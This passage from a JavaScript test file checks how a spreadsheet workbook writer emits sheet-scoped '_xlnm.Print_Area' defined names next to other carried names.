      attributeOf(name, "localSheetId"),
      textContent(name),
    ]);
  }

  it("writes a carried sheet-scoped Print_Area verbatim and suppresses the structured derivation for the same scope", () => {
    const pkg = workbookWithNames([
      {
        name: "_xlnm.Print_Area",
        refersTo: "Printed!$C$3:$D$9",
        scopeSheetIndex: 0,
      },
    ]);
    expect(definedNameRows(pkg)).toEqual([
      ["_xlnm.Print_Area", "0", "Printed!$C$3:$D$9"],
    ]);
  });

  it("derives the print area beside a carried name of a different scope or a different name", () => {
    const pkg = workbookWithNames([
      { name: "MyRange", refersTo: "Printed!$A$1" },
      {
        name: "_xlnm.Print_Area",
        refersTo: "Other!$A$1:$B$2",
        scopeSheetIndex: 3,
      },
    ]);
    expect(definedNameRows(pkg)).toEqual([
      ["MyRange", undefined, "Printed!$A$1"],
      ["_xlnm.Print_Area", "3", "Other!$A$1:$B$2"],
      ["_xlnm.Print_Area", "0", "Printed!$A$1:$B$5"],
    ]);
  });
});
